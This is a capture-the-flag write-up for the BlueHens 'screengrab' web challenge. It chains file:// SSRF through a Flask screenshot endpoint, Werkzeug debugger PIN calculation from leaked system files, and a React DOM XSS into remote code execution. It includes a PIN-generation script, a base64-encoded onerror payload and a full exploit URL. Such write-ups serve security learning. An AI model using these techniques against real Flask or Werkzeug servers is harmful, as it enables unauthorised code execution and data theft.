---
title: "screengrab"
excerpt: "Web, BlueHens CTF"
coverImage: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
date: "2026-04-20"
author:
  name: dolipr4necrypt0
  picture: "/assets/blog/authors/dolipr4necrypt0.png"
ogImage:
  url: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
---

In this challenge, we have an an application that allows users to take screenshots. The backend is built with Flask, while the frontend uses React.

The exploit chain involves leveraging an SSRF to access local files, calculating the Werkzeug Debugger PIN, and combining this with a frontend XSS to ultimately achieve remote code execution (RCE).

# Initial Observations

Looking at the backend, we find an endpoint that uses Chromium to take a screenshot:

```python
@app.route('/api/screenshot')
def screenshot():
    url = request.args.get('url')
    if not url:
        return "URL parameter is missing", 400

    with sync_playwright() as p:
        # browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--single-process",
        '--disable-extensions',
        '--disable-background-networking',
        '--disable-sync',
        '--disable-default-apps',
        '--disable-translate',
        '--no-first-run',
        '--disable-features=TranslateUI',
        '--js-flags=--max-old-space-size=512',])
        page = browser.new_page()
        try:
            page.goto(url)
            page.wait_for_load_state('domcontentloaded');
            page.wait_for_timeout(1337)
            screenshot_bytes = page.screenshot()
            return send_file(io.BytesIO(screenshot_bytes), mimetype='image/png')
        except Exception as e:
            return str(e), 500
        finally:
            browser.close()
```

This feature trivially leads to local file disclosure via the file:// scheme. For example, we can retrieve /etc/passwd by supplying the URL `file:///etc/passwd`. Unfortunately, flag.txt is only readable by root, but there is an SUID binary that can read the flag. So we need an RCE to solve the challenge.

# Debug mode

We notice in the source code that the Flask application is run in debug mode:
```python
app.run(debug=True, host='0.0.0.0', port=1337)
```

This exposes the interactive Werkzeug debugger at /console. When accessing /console from outside the container, the server returns a 400 Bad Request. However, by requesting a screenshot of `http://127.0.0.1:1337/console`, we can access the debugger interface, which prompts for a PIN.

The console allows arbitrary Python execution once unlocked. To obtain access, we must calculate the PIN by leaking specific environment and system values via our local file read primitive.

# Calculating the PIN

The PIN generation algorithm relies on a combination of public and private bits. This is well documented, for example from [https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html). They reverse-engineered the logic from the open-source Werkzeug repository..

We need:
- Username: the app runs as user.
- Module name: flask.app.
- Application name: Flask.
- Flask path: /usr/local/lib/python3.12/site-packages/flask/app.py.
- MAC Address
- Machine ID
- cgroups

The private values can be retrieved using the local file read primitive. For instance:
- MAC Address is accessible from /sys/class/net/eth0/address. 
- Machine ID is accessible from /etc/machine-id.
- cgroups is accessible from /proc/self/cgroup.

With these values, we ran a standard Werkzeug PIN generation script locally:
```python
import hashlib
from itertools import chain

probably_public_bits = ['user', 'flask.app', 'Flask', '/usr/local/lib/python3.12/site-packages/flask/app.py']
private_bits = ['200650965259437', '186d16078e564464a35d35001079d92d']

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    h.update(bit.encode('utf-8') if isinstance(bit, str) else bit)
h.update(b'cookiesalt')

num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv = '-'.join(num[x:x + 3].rjust(3, '0') for x in range(0, len(num), 3))
print(f"Your Werkzeug PIN is: {rv}")
```

Output: 779-491-697.

To authenticate via the url, we also need the SECRET value embedded in the javascript of the /console page. To extract it, we use `view-source:http://127.0.0.1:1337/console` and rely on the screenshot output to read the SECRET token embedded in the HTML.

When requesting a screenshot of `http://127.0.0.1:1337/console?__debugger__=yes&cmd=pinauth&pin=779-491-697&s=yNeBOcbRojXk5fR2E3iC`, we receive {auth: true}, confirming that both the PIN and SECRET are valid.

However, we cannot directly execute commands in a single request. The debugger requires a two-step interaction: first, the pinauth request sets an authentication cookie, and then a second request using the same session can execute arbitrary commands.

At this stage, purely backend exploitation appears to be blocked.

# XSS in the frontend

Looking at the React frontend (App.js), we spot the "mistake" (or just what we need to solve the challenge):
```javascript
const urlParams = new URLSearchParams(window.location.search);
const title = urlParams.get('title');
<h2 className="post-title" dangerouslySetInnerHTML={{ __html: post.title }}></h2>
```
The title GET parameter is passed directly into dangerouslySetInnerHTML, resulting in a DOM-based XSS vulnerability. This allows us to execute arbitrary javascript and complete the exploitation chain.

# Final Exploit

We write a javascript payload that:
- Authenticates with the Werkzeug console.
- Executes a python command to read the flag.
- Overwrites the DOM with the output to recover the flag in the screenshot.

```javascript
fetch('/console?__debugger__=yes&cmd=pinauth&pin=779-491-697&s=yNeBOcbRojXk5fR2E3iC')
.then(r => fetch('/console?__debugger__=yes&cmd=__import__("os").popen("/app/read_flag").read()&frm=0&s=yNeBOcbRojXk5fR2E3iC'))
.then(r => r.text())
.then(t => document.body.innerHTML = t)
```

Because React blocks standard <script> tags injected via innerHTML, we bypass this by wrapping the payload in an <img> tag's onerror event handler. We Base64-encode the payload to prevent any URL-parsing or quote-escaping issues:

```javascript
<img src=x onerror="eval(atob('ZmV0Y2goJy9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTc3OS00OTEtNjk3JnM9eU5lQk9jYlJvalhrNWZSMkUzaUMnKS50aGVuKHI9PmZldGNoKCcvY29uc29sZT9fX2RlYnVnZ2VyX189eWVzJmNtZD1fX2ltcG9ydF9fKCJvcyIpLnBvcGVuKCIvYXBwL3JlYWRfZmxhZyIpLnJlYWQoKSZmcm09MCZzPXlOZUJPY2JSb2pYazVmUjJFM2lDJykpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4odD0+ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9dCk='))">
```

The final exploit is:
```javascript
http://127.0.0.1:1337/?url=http://example.com&title=%3Cimg%20src%3Dx%20onerror%3D%22eval%28atob%28%27ZmV0Y2goJy9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTc3OS00OTEtNjk3JnM9eU5lQk9jYlJvalhrNWZSMkUzaUMnKS50aGVuKHI9PmZldGNoKCcvY29uc29sZT9fX2RlYnVnZ2VyX189eWVzJmNtZD1fX2ltcG9ydF9fKCJvcyIpLnBvcGVuKCIvYXBwL3JlYWRfZmxhZyIpLnJlYWQoKSZmcm09MCZzPXlOZUJPY2JSb2pYazVmUjJFM2lDJykpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4odD0+ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9dCk=%27%29%29%22%3E
```

When Chromium takes a screenshot of this url, the XSS payload is triggered via the onerror handler of the <img> tag. This executes the javascript, which sends the two requests required to achieve RCE. The response is then used to overwrite the page content with the command output, allowing the flag to be captured in the screenshot.